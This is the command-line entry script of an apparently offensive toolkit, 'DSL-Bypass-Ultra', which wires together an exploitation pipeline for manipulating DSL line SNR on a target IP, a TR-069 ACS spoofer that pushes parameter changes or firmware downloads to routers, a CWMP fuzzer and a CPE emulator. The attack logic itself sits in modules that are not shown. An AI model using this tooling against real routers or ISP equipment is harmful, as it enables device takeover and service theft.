"""
DSL-Bypass-Ultra - Automated Exploitation and TR-069 Analysis Framework
"""
import logging
import argparse
import threading
from unittest.mock import MagicMock

from src.exploit_pipeline import ExploitPipeline
from src.tr069.acs_spoofer import ACSSpoofer
from src.tr069.client_emulator import CpeEmulator
from src.tr069.fuzzer import CwmpFuzzer

def run_pipeline(args):
    """Runs the main exploitation pipeline."""
    print(f"🚀 Initializing DSL Bypass Ultra v1.1 - Pipeline Mode (Strategy: {args.strategy}) 🚀")
    try:
        pipeline = ExploitPipeline(
            target_ip=args.target_ip,
            community_string='public',
            signature_file='src/vendor_signatures.json',
            target_rate_mbps=125.0,
            manipulation_strategy=args.strategy
        )
        mock_ssh_interface = MagicMock()
        pipeline.ssh_interface = mock_ssh_interface
        pipeline.detector.ssh_interface = mock_ssh_interface
        pipeline.run()
        print("\n🎉 Pipeline execution finished. 🎉")
    except Exception as e:
        logging.critical(f"A critical error occurred in the pipeline: {e}", exc_info=True)
        print(f"❌ Pipeline execution failed. See logs for details.")

def run_acs_spoofer(args):
    """Runs the TR-069 ACS Spoofer."""
    print("🚀 Initializing TR-069 ACS Spoofer 🚀")
    spoofer = ACSSpoofer(host=args.host, port=args.port)

    if args.command == 'set-param':
        if not all([args.param_name, args.param_value, args.param_type]):
            raise ValueError("Parameter name, value, and type are required for set-param.")
        spoofer.queue_set_parameter_value(args.param_name, args.param_value, args.param_type)

    elif args.command == 'firmware-dl':
        if not all([args.firmware_url, args.firmware_size]):
            raise ValueError("Firmware URL and size are required for firmware-dl.")
        spoofer.queue_firmware_download_request(args.firmware_url, args.firmware_size)

    try:
        spoofer.start()
    except KeyboardInterrupt:
        spoofer.stop()
        logging.info("ACS Spoofer stopped by user.")

def run_fuzzer(args):
    """Runs the TR-069 Fuzzer."""
    print("🚀 Initializing TR-069 Fuzzer 🚀")
    if not args.target_ip:
        raise ValueError("Target IP is required for the fuzzer.")
    fuzzer = CwmpFuzzer(target_host=args.target_ip, target_port=args.port)
    fuzzer.run()
    print("\n🎉 Fuzzer execution finished. 🎉")

def run_cpe_emulator(args):
    """Runs the TR-069 CPE Emulator."""
    print("🚀 Initializing TR-069 CPE Emulator 🚀")
    emulator = CpeEmulator(acs_host=args.host, acs_port=args.port)
    emulator.connect_and_inform()
    print("\n🎉 CPE Emulator execution finished. 🎉")

def main():
    """
    Main entry point for the DSL Bypass Ultra framework.
    """
    parser = argparse.ArgumentParser(description="DSL Bypass Ultra - Exploitation and TR-069 Analysis Framework")

    subparsers = parser.add_subparsers(dest='mode', required=True, help='The operational mode.')

    # Pipeline mode
    parser_pipeline = subparsers.add_parser('pipeline', help='Run the full DSL exploitation pipeline.')
    parser_pipeline.add_argument('target_ip', help='The IP address of the target device.')
    parser_pipeline.add_argument(
        '--strategy',
        choices=['static', 'dynamic_reduce', 'adaptive'],
        default='static',
        help='The SNR manipulation strategy to use.'
    )
    parser_pipeline.set_defaults(func=run_pipeline)

    # ACS Spoofer mode
    parser_acs = subparsers.add_parser('acs', help='Run the TR-069 ACS Spoofer.')
    parser_acs.add_argument('--host', default='0.0.0.0', help='Host address to bind the spoofer to.')
    parser_acs.add_argument('--port', type=int, default=7547, help='Port to listen on.')
    parser_acs.add_argument('--command', choices=['set-param', 'firmware-dl'], help='A command to queue before starting.')
    parser_acs.add_argument('--param-name', help='Parameter name for set-param.')
    parser_acs.add_argument('--param-value', help='Parameter value for set-param.')
    parser_acs.add_argument('--param-type', default='xsd:string', help='Parameter type for set-param (e.g., xsd:int, xsd:boolean).')
    parser_acs.add_argument('--firmware-url', help='URL for firmware-dl.')
    parser_acs.add_argument('--firmware-size', type=int, help='File size for firmware-dl.')
    parser_acs.set_defaults(func=run_acs_spoofer)

    # Fuzzer mode
    parser_fuzzer = subparsers.add_parser('fuzzer', help='Run the TR-069 client fuzzer.')
    parser_fuzzer.add_argument('target_ip', help='The IP address of the target CPE.')
    parser_fuzzer.add_argument('--port', type=int, default=7547, help='Target port on the CPE.')
    parser_fuzzer.set_defaults(func=run_fuzzer)

    # CPE Emulator mode
    parser_cpe = subparsers.add_parser('cpe-emu', help='Run the TR-069 CPE emulator to test an ACS.')
    parser_cpe.add_argument('--host', default='localhost', help='Host address of the ACS.')
    parser_cpe.add_argument('--port', type=int, default=7547, help='Port of the ACS.')
    parser_cpe.set_defaults(func=run_cpe_emulator)

    args = parser.parse_args()
    args.func(args)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    main()